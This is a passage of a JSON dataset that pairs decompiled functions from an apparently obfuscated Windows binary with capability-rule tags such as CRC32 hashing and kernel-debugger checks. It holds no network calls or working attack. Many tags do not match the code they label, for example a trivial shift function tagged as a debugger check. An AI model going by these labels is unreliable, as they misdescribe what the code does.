1);\n                return CONCAT44(param_3, param_1) & 0x3ffffffff;\n            case 3:\n                *puVar39 = *param_2;\n                *(puVar39 + 1) = *(param_2 + 1);\n                *(puVar39 + 2) = *(param_2 + 2);\n                return CONCAT44(param_3, param_1) & 0x3ffffffff;\n            }\n        }\n    }\ncode_r0x0048628b:\n    if ((uVar33 & 0x1f) != 0) {\n        for (uVar34 = (uVar33 & 0x1f) >> 2; uVar34 != 0; uVar34 = uVar34 - 1) {\n            param_3 = *param_2;\n            *puVar39 = param_3;\n            puVar39 = puVar39 + 4;\n            param_2 = param_2 + 4;\n        }\n        for (uVar33 = uVar33 & 3; uVar33 != 0; uVar33 = uVar33 - 1) {\n            *puVar39 = *param_2;\n            param_2 = param_2 + 1;\n            puVar39 = puVar39 + 1;\n        }\n    }\ncode_r0x004862c0:\n    return CONCAT44(param_3, param_1);\n}\n",
        "token_count": 6184
    },
    "00405bd7": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405bd7(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00401f73(8, 0);\n    return;\n}\n",
        "token_count": 92
    },
    "004010aa": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004010aa(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack212;\n    uchar auStack208 [24];\n    uchar auStack184 [24];\n    int32_t iStack160;\n    uchar auStack156 [24];\n    uchar auStack132 [24];\n    int32_t iStack108;\n    ulong uStack104;\n    uchar uStack65;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff10;\n    uStack28 = 0x418090;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"wziggmoivdhxezdporztmdasarjfeqrawkvhmtwnghpdfzo\");\n    uStack65 = 0;\n    uStack24 = 2;\n    fcn.00401e79(\"kdpwbpxsirarvyhtmealnbcipeiwxptcvtoleqbzp\");\n    uStack104 = *0x4ec238;\n    for (iStack108 = 0x48; 0 < iStack108; iStack108 = iStack108 + -1) {\n    }\n    uStack24 = 3;\n    fcn.00401e79(\"kdpwbpxsirarvyhtmealnbcipeiwxptcvtoleqbzp\");\n    uStack24 = 5;\n    fcn.00401e79(\"kdpwbpxsirarvyhtmealnbcipeiwxptcvtoleqbzp\");\n    uVar1 = fcn.004042dc(auStack156, auStack132);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack160 = 0x2f; 0 < iStack160; iStack160 = iStack160 + -1) {\n        }\n    }\n    uStack24 = 3;\n    fcn.00401e79(\"kdpwbpxsirarvyhtmealnbcipeiwxptcvtoleqbzp\");\n    uStack24 = 4;\n    fcn.00401e79(\"kdpwbpxsirarvyhtmealnbcipeiwxptcvtoleqbzp\");\n    uVar1 = fcn.00405b37(auStack208, auStack184);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack212 = 0x12; 0 < iStack212; iStack212 = iStack212 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x6bc6;\n}\n",
        "token_count": 716
    },
    "004010d2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004010d2(uint8_t *arg_8h, uint8_t *arg_ch, uint8_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint uVar6;\n    bool bVar7;\n    \n    iVar2 = *(arg_8h + 4);\n    if (((iVar2 == 0) || (puVar5 = iVar2 + 8,  *puVar5 == 0)) || (((*arg_8h & 0x80) != 0 && ((*arg_ch & 0x10) != 0)))) {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = 0;\n        if (iVar2 != *(arg_ch + 4)) {\n            puVar3 = *(arg_ch + 4) + 8;\n            do {\n                uVar1 = *puVar5;\n                bVar7 = uVar1 < *puVar3;\n                if (uVar1 != *puVar3) {\ncode_r0x0048a56e:\n                    uVar4 = -bVar7 | 1;\n                    goto code_r0x0048a573;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar5[1];\n                bVar7 = uVar1 < puVar3[1];\n                if (uVar1 != puVar3[1]) goto code_r0x0048a56e;\n                puVar5 = puVar5 + 2;\n                puVar3 = puVar3 + 2;\n            } while (uVar1 != 0);\n            uVar4 = 0;\ncode_r0x0048a573:\n            if (uVar4 != 0) {\n                return 0;\n            }\n        }\n        if ((((*arg_ch & 2) == 0) || ((*arg_8h & 8) != 0)) &&\n           ((((*arg_10h & 1) == 0 || ((*arg_8h & 1) != 0)) && (((*arg_10h & 2) == 0 || ((*arg_8h & 2) != 0)))))) {\n            uVar6 = 1;\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 532
    },
    "0040111d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint64_t __cdecl fcn.0040111d(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint var_8h;\n    uint var_1h;\n    \n    return arg_8h << 0x20;\n}\n",
        "token_count": 70
    },
    "0040123f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0040123f(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack224;\n    uchar auStack220 [24];\n    uchar auStack196 [27];\n    uchar uStack169;\n    uint uStack168;\n    uint uStack164;\n    uchar uStack129;\n    uint uStack56;\n    uchar uStack49;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff00;\n    uStack28 = 0x450860;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40ea34c0;\n    uStack48 = 0;\n    uStack49 = 1;\n    uStack56 = 0x436;\n    uStack24 = 2;\n    fcn.00401e79(\"gxdo\");\n    uStack24 = 3;\n    fcn.00401e79(\"lfmjnvlxiuuahdojwtlzldltijaarbnhtucntiwtppbplmhakthxnpqlsgabztlfevb\");\n    uStack24 = 4;\n    fcn.00401e79(\"knnbcxvbxrijwsnzqdmkoopteqevrrlcrejcndsrwtynbnhphwucvqaourwjvkeimppidsxcrcbmfvuaxolcskb\");\n    uStack129 = 0;\n    uStack24 = 5;\n    fcn.00401e79(\"ylwqvmuvndxwthynuxhcttsyhshsgqrhgunvoczfsvneofrfeyuqprpacnzjzindzgjytociyzvilmofe\");\n    uStack164 = 0x40ca9b80;\n    uStack168 = 0;\n    uStack169 = 1;\n    uStack24 = 6;\n    fcn.00401e79(\"gxdo\");\n    uStack24 = 7;\n    fcn.00401e79(\"gxdo\");\n    uVar1 = fcn.00405b37(auStack220, auStack196);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack224 = 3; 0 < iStack224; iStack224 = iStack224 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 681
    },
    "00401262": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl\nfcn.00401262(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint noname_5, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_00000024;\n    int32_t iStack240;\n    int32_t iStack236;\n    uchar auStack232 [24];\n    uchar auStack208 [24];\n    int32_t iStack184;\n    uchar auStack180 [24];\n    uchar auStack156 [24];\n    int32_t iStack132;\n    ulong uStack128;\n    uint uStack96;\n    uint uStack92;\n    uint8_t uStack58;\n    uint8_t uStack57;\n    ulong uStack56;\n    ulong uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff00;\n    uStack48 = CONCAT44(in_stack_00000024, arg_24h);\n    uStack56 = CONCAT44(noname_5, arg_18h);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x450880;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack57 = arg_14h & 1;\n    uStack58 = arg_8h & 1;\n    fcn.00401e79(\"qhmuxuofwvqxvty\");\n    uStack92 = 0x40d0dac0;\n    uStack96 = 0;\n    uStack24 = 0;\n    fcn.00401e79(\"jgzbmxuakacbbiobyxbdwmafspaesukzgrnfbwounuuswsfugxm\");\n    uStack128 = *0x546e68;\n    for (iStack132 = 7; 0 < iStack132; iStack132 = iStack132 + -1) {\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"qhmuxuofwvqxvty\");\n    uStack24 = 3;\n    fcn.00401e79(\"qhmuxuofwvqxvty\");\n    uVar1 = fcn.00405b37(auStack180, auStack156);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack184 = 99; 0 < iStack184; iStack184 = iStack184 + -1) {\n        }\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"qhmuxuofwvqxvty\");\n    uStack24 = 2;\n    fcn.00401e79(\"qhmuxuofwvqxvty\");\n    uVar1 = fcn.00405b37(auStack232, auStack208);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack236 = 0x61; 0 < iStack236; iStack236 = iStack236 + -1) {\n        }\n    }\n    for (iStack240 = 0x39; 0 < iStack240; iStack240 = iStack240 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 843
    },
    "00401325": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl\nfcn.00401325(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint arg_28h, uint arg_2ch)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack300;\n    int32_t iStack296;\n    int32_t iStack292;\n    uchar auStack288 [24];\n    uchar auStack264 [24];\n    int32_t iStack240;\n    uchar auStack236 [24];\n    uchar auStack212 [24];\n    int32_t iStack188;\n    uchar auStack184 [24];\n    uchar auStack160 [48];\n    uint uStack112;\n    uint uStack108;\n    uchar uStack97;\n    uint8_t uStack65;\n    ulong uStack64;\n    uint8_t uStack50;\n    uchar uStack49;\n    ulong uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffec0;\n    uStack48 = CONCAT44(noname_7, arg_20h);\n    uStack64 = CONCAT44(noname_3, arg_10h);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x451660;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uVar2 = CONCAT11(arg_1ch, arg_ch) & 0x1ff;\n    uStack49 = uVar2 >> 8;\n    uStack50 = arg_18h & 1;\n    uStack65 = uVar2 & 1;\n    fcn.00401e79(\"hjmanawjlblszbottscnefwhbbhzncopuqirzzzufdzylnqrzxwnz\");\n    uStack97 = 0;\n    uStack108 = 0x40e50180;\n    uStack112 = 0;\n    uStack24 = 0;\n    fcn.00401e79(\"zhlzorhqukkezn\");\n    uStack24 = 1;\n    fcn.00401e79(\"zhlzorhqukkezn\");\n    uStack24 = 4;\n    fcn.00401e79(\"zhlzorhqukkezn\");\n    uVar1 = fcn.00405b37(auStack184, auStack160);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack188 = 0xb; 0 < iStack188; iStack188 = iStack188 + -1) {\n        }\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"zhlzorhqukkezn\");\n    uStack24 = 3;\n    fcn.00401e79(\"zhlzorhqukkezn\");\n    uVar1 = fcn.004042dc(auStack236, auStack212);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack240 = 3; 0 < iStack240; iStack240 = iStack240 + -1) {\n        }\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"zhlzorhqukkezn\");\n    uStack24 = 2;\n    fcn.00401e79(\"zhlzorhqukkezn\");\n    uVar1 = fcn.004042dc(auStack288, auStack264);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack292 = 0x46; 0 < iStack292; iStack292 = iStack292 + -1) {\n        }\n    }\n    for (iStack296 = 0x32; 0 < iStack296; iStack296 = iStack296 + -1) {\n    }\n    for (iStack300 = 3; 0 < iStack300; iStack300 = iStack300 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 1039
    },
    "00401361": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nchar ** __cdecl fcn.00401361(char **arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    uint var_28h;\n    uint var_20h;\n    char *var_18h;\n    char *var_14h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    cVar1 = **0x574458;\n    if (cVar1 == '\\0') {\n        var_10h = \"`unknown ecsu\\'\";\n        var_ch = 0xe;\n        fcn.00402d47(&var_10h);\n        fcn.004062fd(arg_8h, 1);\n        return arg_8h;\n    }\n    var_10h = NULL;\n    var_ch = NULL;\n    if (cVar1 == 'W') {\n        if ((~(*0x574460 >> 0xf) & 1) != 0) {\ncode_r0x0048f335:\n            *0x574458 = *0x574458 + 1;\n            var_8h = NULL;\n            var_4h = NULL;\n            if (cVar1 == 'T') {\n                var_18h = \"union \";\ncode_r0x0048f3ef:\n                var_14h = 0x6;\ncode_r0x0048f3f6:\n                fcn.004022f7(&var_18h);\n            }\n            else {\n                if (cVar1 == 'U') {\n                    var_18h = \"struct \";\n                    var_14h = 0x7;\n                    goto code_r0x0048f3f6;\n                }\n                if (cVar1 == 'V') {\n                    var_18h = \"class \";\n                    goto code_r0x0048f3ef;\n                }\n                if (cVar1 != 'W') {\n                    if (cVar1 == 'X') {\n                        var_18h = \"coclass \";\n                        var_14h = 0x8;\n                    }\n                    else {\n                        if (cVar1 != 'Y') goto code_r0x0048f402;\n                        var_18h = \"cointerface \";\n                        var_14h = 0xc;\n                    }\n                    goto code_r0x0048f3f6;\n                }\n                var_18h = \"enum \";\n                var_14h = 0x5;\n                arg_ch = fcn.00402892(&var_20h);\n                fcn.00402d47(&var_18h);\n                fcn.004053b7(&var_18h, arg_ch);\n                var_8h = var_18h;\n                var_4h = var_14h;\n            }\ncode_r0x0048f402:\n            var_10h = var_8h;\n            var_ch = var_4h;\n            goto code_r0x0048f2f4;\n        }\n    }\n    else if (((~(*0x574460 >> 0xf) & 1) != 0) && ((*0x574460 & 0x1000) == 0)) goto code_r0x0048f335;\n    *0x574458 = *0x574458 + 1;\n    if (cVar1 == 'W') {\n        fcn.00402892(&var_28h);\n    }\ncode_r0x0048f2f4:\n    fcn.004064b0(&var_18h);\n    fcn.00402eeb(&var_18h);\n    *arg_8h = var_10h;\n    arg_8h[1] = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 818
    },
    "00401393": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00401393(uint arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_00000010;\n    int32_t iStack176;\n    uchar auStack172 [24];\n    uchar auStack148 [51];\n    uchar uStack97;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack61;\n    ulong uStack56;\n    ulong uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff40;\n    uStack48 = CONCAT44(in_stack_00000010, arg_10h);\n    uStack56 = CONCAT44(noname_1, arg_8h);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x451240;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack61 = 0;\n    fcn.00401e79(\"cwagoburmgnobayh\");\n    uStack92 = 0x40e966c0;\n    uStack96 = 0;\n    uStack97 = 1;\n    uStack24 = 0;\n    fcn.00401e79(\"fsjukmhozidiwlrmaimzxvdoiphjwabrynvalbrqnvofhiizktxqtcxqsdnlmcionmhdtcqqphznelmqpbpwdpkljvmvdotyqdp\");\n    uStack24 = 1;\n    fcn.00401e79(\"fsjukmhozidiwlrmaimzxvdoiphjwabrynvalbrqnvofhiizktxqtcxqsdnlmcionmhdtcqqphznelmqpbpwdpkljvmvdotyqdp\");\n    uStack24 = 2;\n    fcn.00401e79(\"fsjukmhozidiwlrmaimzxvdoiphjwabrynvalbrqnvofhiizktxqtcxqsdnlmcionmhdtcqqphznelmqpbpwdpkljvmvdotyqdp\");\n    uVar1 = fcn.00405b37(auStack172, auStack148);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack176 = 0x4f; 0 < iStack176; iStack176 = iStack176 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x3cc0;\n}\n",
        "token_count": 654
    },
    "00401398": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl\nfcn.00401398(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h, uint noname_5, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack160;\n    int32_t iStack156;\n    int32_t iStack152;\n    int32_t iStack148;\n    uchar auStack144 [24];\n    uchar auStack120 [24];\n    uint uStack96;\n    uchar uStack89;\n    uint8_t uStack57;\n    ulong uStack56;\n    ulong uStack48;\n    uint8_t uStack37;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff50;\n    uStack48 = CONCAT44(noname_5, arg_18h);\n    uStack56 = CONCAT44(noname_3, arg_10h);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x450960;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack37 = arg_20h & 1;\n    uStack57 = arg_ch & 1;\n    fcn.00401e79(\"unaapkogkupzbaswcakideyirpsfnllkadvahxisubrdfrunsgx\");\n    uStack89 = 1;\n    uStack96 = 0xcd7;\n    uStack24 = 0;\n    fcn.00401e79(\"unaapkogkupzbaswcakideyirpsfnllkadvahxisubrdfrunsgx\");\n    uStack24 = 1;\n    fcn.00401e79(\"unaapkogkupzbaswcakideyirpsfnllkadvahxisubrdfrunsgx\");\n    uVar1 = fcn.00405b37(auStack144, auStack120);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack148 = 0x2b; 0 < iStack148; iStack148 = iStack148 + -1) {\n        }\n    }\n    for (iStack152 = 0xb; 0 < iStack152; iStack152 = iStack152 + -1) {\n    }\n    for (iStack156 = 1; 0 < iStack156; iStack156 = iStack156 + -1) {\n    }\n    for (iStack160 = 0x11; 0 < iStack160; iStack160 = iStack160 + -1) {\n    }\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 678
    },
    "004013a2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004013a2(uint32_t arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    fcn.00406005(arg_ch);\n    if ((arg_ch[3] & 6) == 0) {\n        puVar2 = fcn.00403a35();\n        *puVar2 = 9;\n    }\n    else {\n        if ((arg_ch[3] >> 0xc & 1) == 0) {\n            if ((arg_ch[3] & 1) != 0) {\n                cVar1 = fcn.004d2ed2(arg_ch);\n                arg_ch[2] = 0;\n                if (cVar1 == '\\0') goto code_r0x004d2a9c;\n                *arg_ch = arg_ch[1];\n                LOCK();\n                arg_ch[3] = arg_ch[3] & 0xfffffffe;\n            }\n            LOCK();\n            arg_ch[3] = arg_ch[3] | 2;\n            LOCK();\n            arg_ch[3] = arg_ch[3] & 0xfffffff7;\n            arg_ch[2] = 0;\n            if (((arg_ch[3] & 0x4c0) == 0) && (cVar1 = fcn.00405362(arg_ch),  cVar1 == '\\0')) {\n                fcn.00401ffa(arg_ch);\n            }\n            cVar1 = fcn.004d2cd2(arg_8h, arg_ch);\n            if (cVar1 == '\\0') {\n                LOCK();\n                arg_ch[3] = arg_ch[3] | 0x10;\n                arg_8h = 0xffffffff;\n            }\n            else {\n                arg_8h = arg_8h & 0xff;\n            }\n            return arg_8h;\n        }\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x22;\n    }\ncode_r0x004d2a9c:\n    LOCK();\n    arg_ch[3] = arg_ch[3] | 0x10;\n    return 0xffffffff;\n}\n",
        "token_count": 480
    },
    "004013b6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl\nfcn.004013b6(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint noname_8, uint arg_2ch, uint arg_30h, uint arg_34h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack200;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x4511a0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"vtmvdhsfrbclarqudxwgzpmwkqcyxulfcatcsxybubpnkunlcikntu\");\n    uStack24 = 0;\n    fcn.00401e79(0x54fa21);\n    uStack24 = 1;\n    fcn.00401e79(\"gvkqsyrlnhphykdtlczkyjtl\");\n    uStack24 = 2;\n    fcn.00401e79(\"cfaddfmyxdxvpzaaencagvwbgblrktdgfvxjrfskvrilpmqnsbwujnaykrluamhwifqkcsxervswalxlmwptuaeslaxvt\");\n    for (iStack200 = 0x5d; 0 < iStack200; iStack200 = iStack200 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 438
    },
    "004013cf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar ** __cdecl fcn.004013cf(char **arg_8h, char **arg_ch, int32_t arg_10h, char **arg_14h, int32_t arg_18h)\n\n{\n    char cVar1;\n    int32_t arg_14h_00;\n    char *pcVar2;\n    char **ppcVar3;\n    uint *arg_8h_00;\n    uint uVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    ulong uVar7;\n    uint var_80h;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    char *var_48h;\n    char *var_44h;\n    char *var_40h;\n    char *var_3ch;\n    char *var_38h;\n    char *var_34h;\n    char *var_30h;\n    char *var_2ch;\n    uint var_28h;\n    char var_1eh;\n    char *var_1dh;\n    char *var_18h;\n    char *var_11h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    arg_14h_00 = arg_18h;\n    ppcVar3 = arg_14h;\n    var_11h._0_1_ = '\\0';\n    if (**0x574458 == '\\0') {\n        if (arg_18h == 0) {\n            if (*arg_ch == NULL) {\n                arg_ch = arg_14h;\n                if (*arg_14h == NULL) goto code_r0x0048eaa5;\n            }\n            else if (((arg_ch[1] & 0x100) == 0) && (*arg_14h != NULL)) {\n                fcn.004017df(1);\n                fcn.004053b7(&var_48h, ppcVar3);\n                fcn.0040330f(&var_50h, 0x20);\n                fcn.004053b7(arg_8h, arg_ch);\n                return arg_8h;\n            }\n            fcn.0040129e(arg_8h, 1, arg_ch);\n            return arg_8h;\n        }\ncode_r0x0048eaa5:\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    if ((**0x574458 != '$') || (fcn.004031fc(&var_1dh + 1, &arg_10h, &var_11h, arg_18h),  stack0xffffffe0 == NULL)) {\n        pcVar6 = NULL;\n        var_2ch = NULL;\n        var_30h = NULL;\n        var_34h = NULL;\n        var_1dh._0_1_ = '\\0';\n        var_1eh = '\\0';\n        uVar5 = **0x574458 - (((**0x574458 < 'A') - 1 & 0x2b) + 0x16);\n        var_38h = NULL;\n        do {\n            if (uVar5 == 4) {\n                if ((~((*0x574460 >> 0x10 | *0x574460) >> 1) & 1) != 0) {\n                    uVar7 = fcn.00402d29(0xb);\n                    if (pcVar6 == NULL) {\n                        arg_8h_00 = &var_11h + 1;\ncode_r0x0048e62a:\n                        unique0x10000e4f = uVar7;\n                        fcn.004022f7(arg_8h_00);\n                        pcVar6 = var_30h;\n                    }\n                    else {\n                        var_3ch = var_2ch;\n                        var_40h = pcVar6;\n                        _var_78h = uVar7;\n                        fcn.00403d55(0x20);\n                        ppcVar3 = fcn.00405164(&var_28h, &var_78h);\n                        pcVar6 = *ppcVar3;\n                        var_2ch = ppcVar3[1];\n                        var_30h = pcVar6;\n                    }\n                }\n            }\n            else if (uVar5 == 5) {\n                if ((~(*0x574460 >> 1) & 1) != 0) {\n                    if (var_38h == NULL) {\n                        uVar7 = fcn.00402d29(0xd);\n                        _var_70h = uVar7;\n                        fcn.004022f7(&var_70h);\n                    }\n                    else {\n                        uVar7 = fcn.00402d29(0xd);\n                        var_8h = var_38h;\n                        var_4h = var_34h;\n                        _var_68h = uVar7;\n                        fcn.00403d55(0x20);\n                        ppcVar3 = 